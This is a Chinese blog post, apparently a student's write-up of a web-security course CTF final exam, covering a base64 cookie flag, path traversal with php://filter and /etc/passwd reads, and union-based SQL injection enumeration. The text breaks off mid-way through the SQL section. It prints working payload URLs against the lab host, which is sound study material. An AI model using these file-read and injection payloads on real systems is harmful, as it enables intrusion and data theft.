@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/moew.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/moew.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mintind.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"stackoverflow-light","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="还是CTF好玩">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Web安全技术】CTF期末考核">
+<meta property="og:url" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/index.html">
+<meta property="og:site_name" content="Mintind&#39;s Blog">
+<meta property="og:description" content="还是CTF好玩">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120103416379.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120110437520.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120105720841.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120110308635.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120110645748.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120110954813.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120112249989.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120114214498.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120115907270.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120115858561.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120120605879.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120121353402.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120164245376.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120171857781.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120172412328.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120172919417.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120173136199.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120214347600.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120224446037.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120224746187.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120230306739.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120230323985.png">
+<meta property="og:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120230841505.png">
+<meta property="article:published_time" content="2025-11-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-20T15:14:22.042Z">
+<meta property="article:author" content="Mintind">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="UCAS">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/image-20251120103416379.png">
+
+
+<link rel="canonical" href="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/","path":"2025/11/20/CTF/Web/web_security_final/","title":"【Web安全技术】CTF期末考核"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【Web安全技术】CTF期末考核 | Mintind's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mintind's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">此心安处是吾乡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#5"><span class="nav-number">1.</span> <span class="nav-text">5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6"><span class="nav-number">2.</span> <span class="nav-text">6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7"><span class="nav-number">3.</span> <span class="nav-text">7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8"><span class="nav-number">4.</span> <span class="nav-text">8</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Mintind</p>
+  <div class="site-description" itemprop="description">这是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mintind" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mintind" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://sarpless.github.io/" title="https:&#x2F;&#x2F;sarpless.github.io&#x2F;" rel="noopener" target="_blank">Sarp</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.cnblogs.com/wanwanjiuhao7744" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wanwanjiuhao7744" rel="noopener" target="_blank">玩玩就好</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="http://jmpcliff.top/" title="http:&#x2F;&#x2F;jmpcliff.top&#x2F;" rel="noopener" target="_blank">Jmp.Cliff</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mintind.github.io/2025/11/20/CTF/Web/web_security_final/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Mintind">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mintind's Blog">
+      <meta itemprop="description" content="这是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【Web安全技术】CTF期末考核 | Mintind's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Web安全技术】CTF期末考核
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-11-20 00:00:00 / 修改时间：23:14:22" itemprop="dateCreated datePublished" datetime="2025-11-20T00:00:00+08:00">2025-11-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>还是CTF好玩</p>
+<span id="more"></span>
+
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>一个这样的页面。在输入flag提交时会显示一串数字ZmxhZ3tXZWxDMG1lX3RvX2N0ZjJ9，用base64解码是flag{WelC0me_to_ctf2}</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120103416379.png" alt="image-20251120103416379"></p>
+<p>请求的cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie</span><br><span class="line">	csrftoken=KNiYX2LvaOBO0Q4NMAD8i9atBOJttqZw; </span><br><span class="line">	FLAG=ZmxhZ3tjb29raWVzLWNvbnRhaW4taW5mb30%3D; </span><br><span class="line">	PHPSESSID=d78c3cc53f77c5c7c4b2e9ae5d8739f1; session=ae983bf8-182b-4f61-87dc-</span><br><span class="line">	6f8c9f02fb0e.fELaQGfxK8tbJ7wiRO_ln-Iew4o</span><br></pre></td></tr></table></figure>
+
+<p><code>FLAG=ZmxhZ3tjb29raWVzLWNvbnRhaW4taW5mb30%3D</code>解码是flag{cookies-contain-info}</p>
+<p>。。。傻掉了，原来这是签到题啊</p>
+<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>蛮混乱的。总之是<strong>路径穿越</strong></p>
+<p>有index和another两个页面跳来跳去。不存在flag页面</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120110437520.png" alt="image-20251120110437520"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.102.144.60:30006/page.php?file=php://filter/convert.base64-encode/resource=page.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120105720841.png" alt="image-20251120105720841"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CjwhZG9jdHlwZSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+V2VsY29tZSE8L3RpdGxlPgoKICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiIC8+CiAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgogICAgYm9keSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2YwZjBmMjsKICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgcGFkZGluZzogMDsKICAgICAgICBmb250LWZhbWlseTogIk9wZW4gU2FucyIsICJIZWx2ZXRpY2EgTmV1ZSIsIEhlbHZldGljYSwgQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgCiAgICB9CiAgICBkaXYgewogICAgICAgIHdpZHRoOiA2MDBweDsKICAgICAgICBtYXJnaW46IDVlbSBhdXRvOwogICAgICAgIHBhZGRpbmc6IDUwcHg7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICAgICAgICBib3JkZXItcmFkaXVzOiAxZW07CiAgICB9CiAgICBhOmxpbmssIGE6dmlzaXRlZCB7CiAgICAgICAgY29sb3I6ICMzODQ4OGY7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgfQogICAgQG1lZGlhIChtYXgtd2lkdGg6IDcwMHB4KSB7CiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGJhY2tncm91bmQt</span><br></pre></td></tr></table></figure>
+
+<p>解码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Welcome!&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        background-color: <span class="comment">#f0f0f2;</span></span><br><span class="line">        margin: <span class="number">0</span>;</span><br><span class="line">        padding: <span class="number">0</span>;</span><br><span class="line">        font-family: <span class="string">&quot;Open Sans&quot;</span>, <span class="string">&quot;Helvetica Neue&quot;</span>, Helvetica, Arial, sans-serif;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    div &#123;</span><br><span class="line">        width: <span class="number">600</span>px;</span><br><span class="line">        margin: <span class="number">5</span>em auto;</span><br><span class="line">        padding: <span class="number">50</span>px;</span><br><span class="line">        background-color: <span class="comment">#fff;</span></span><br><span class="line">        border-radius: <span class="number">1</span>em;</span><br><span class="line">    &#125;</span><br><span class="line">    a:link, a:visited &#123;</span><br><span class="line">        color: <span class="comment">#38488f;</span></span><br><span class="line">        text-decoration: none;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">media</span> (max-<span class="attr">width</span>: <span class="number">700</span>px) &#123;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-</span><br></pre></td></tr></table></figure>
+
+<p>加路径穿越会被检测捏</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120110308635.png" alt="image-20251120110308635"></p>
+<p>&#x2F;etc&#x2F;passwd可以捏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.102.144.60:30006/page.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120110645748.png" alt="image-20251120110645748"></p>
+<p>笑死我了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.102.144.60:30006/page.php?file=page.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120110954813.png" alt="image-20251120110954813"></p>
+<p><del>终于想起来用curl就可以看到源代码了！</del></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;http://39.102.144.60:30006/page.php?file=php://filter/convert.base64-encode/resource=page.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>还是只有这些，但是看到了检测逻辑</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">CjwhZG9jdHlwZSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+V2VsY29tZSE8L3RpdGxlPgoKICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiIC8+CiAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgogICAgYm9keSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2YwZjBmMjsKICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgcGFkZGluZzogMDsKICAgICAgICBmb250LWZhbWlseTogIk9wZW4gU2FucyIsICJIZWx2ZXRpY2EgTmV1ZSIsIEhlbHZldGljYSwgQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgCiAgICB9CiAgICBkaXYgewogICAgICAgIHdpZHRoOiA2MDBweDsKICAgICAgICBtYXJnaW46IDVlbSBhdXRvOwogICAgICAgIHBhZGRpbmc6IDUwcHg7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICAgICAgICBib3JkZXItcmFkaXVzOiAxZW07CiAgICB9CiAgICBhOmxpbmssIGE6dmlzaXRlZCB7CiAgICAgICAgY29sb3I6ICMzODQ4OGY7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgfQogICAgQG1lZGlhIChtYXgtd2lkdGg6IDcwMHB4KSB7CiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGJhY2tncm91bmQt</span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (strpos($file_path, &quot;.&quot;) === 0 || substr_count($file_path, &quot;..&quot;) &gt; 2) &#123;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;p&gt;malicious parameter&lt;/&gt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>curl another页面给出了文件结构（不早说）</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120112249989.png" alt="image-20251120112249989"></p>
+<p>所以就是要绕过检测返回上一级目录，到达flag</p>
+<p>检测逻辑：以<code>.</code>开头或者超过两个<code>..</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($file_path, &quot;.&quot;) === 0 || substr_count($file_path, &quot;..&quot;) &gt; 2) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;malicious parameter&lt;/&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>试了&#x2F;var&#x2F;www&#x2F;flag和index&#x2F;..&#x2F;..&#x2F;flag等等，都是提示不存，最后还是用了filter</p>
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.102.144.60:30006/page.php?file=php://filter/resource=../flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120114214498.png" alt="image-20251120114214498"></p>
+<p>好奇怪（</p>
+<p>可能有权限限制，卡密说&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;..&#x2F;flag可以</p>
+<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><strong>SQL注入</strong>。</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120115907270.png" alt="image-20251120115907270"></p>
+<p>只发现了有个隐藏的翻译框（？</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120115858561.png" alt="image-20251120115858561"></p>
+<p>可以加查询语句，感觉像sql注入（）</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120120605879.png" alt="image-20251120120605879"></p>
+<p><code>http://39.102.144.60:30007/?id=1</code>返回no result，但是<code>http://39.102.144.60:30007/?id=MQ==</code>可以（经过base64编码）</p>
+<p><del>为什么大佬的url一开始就有<code>id=MQ== </code>啊</del></p>
+<p>s_id怎么改都是返回张三，改id（加上base64）倒是有其他的记录，应该是有相应的过滤或者检查。总之确定了注入点是<code>id=</code>加上<strong>base64编码</strong>内容</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120121353402.png" alt="image-20251120121353402"></p>
+<p>用永真式<strong>判断是数值型注入还是字符型注入</strong></p>
+<p>字符型：id&#x3D;<code>&#39; or &#39;1&#39;=&#39;1</code>。这种说明查询语句是包在引号里的。这个返回no result</p>
+<p>数值型：id&#x3D;<code>1 or 1</code>。结果变多了，是数值型</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120164245376.png" alt="image-20251120164245376"></p>
+<p>用order by<strong>判断列数</strong>。原理：</p>
+<blockquote>
+<p>order by是按第 n 列排序，如果库表里根本没有第 n 列，报错；不报错就说明列数 ≥ n</p>
+</blockquote>
+<p>到id&#x3D;<code>1 order by 3</code>的时候no了，所以一共两列</p>
+<p>然后用UNION SELECT，刺探数据库信息。原理大概是，比如说查询是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>就会返回两条记录，一条是id&#x3D;1的记录，一条是1,2,3（这个没有实际意义，随便填的）。有个限制就是用了union，那么两条记录返回的列数需要相同。</p>
+<p>所以其实也不需要用order by来判断列数了，因为一开始返回数据就是<code>S_ID: 1 - S_Name: Zhang, San</code>，看得出来是两列。也可以猜测到原查询语句大概是这样（不知道表名所以没有FROM，大括号里是注入的内容）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S_ID,S_Name <span class="keyword">WHERE</span> id<span class="operator">=</span>&#123;<span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,database()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取数据库名</strong>。id&#x3D;<code>1 UNION SELECT 1,database()</code>，<code>http://39.102.144.60:30007/?id=MSBVTklPTiBTRUxFQ1QgMSxkYXRhYmFzZSgp</code></p>
+<p>返回的第一行数据对应<code>SELECT S_ID,S_Name WHERE id=1</code>，第二行是<code>SELECT 1,database()</code>，第一列数据是我们指定的1，第二列是数据库名websec</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120171857781.png" alt="image-20251120171857781"></p>
+<p><strong>获取表名</strong>。group_concat是聚合函数，把所有结果拼成一行。information_schema是系统自带数据库，存着所有库、表、列名。table_schema指定数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;websec&#x27;</span></span><br></pre></td></tr></table></figure>
+
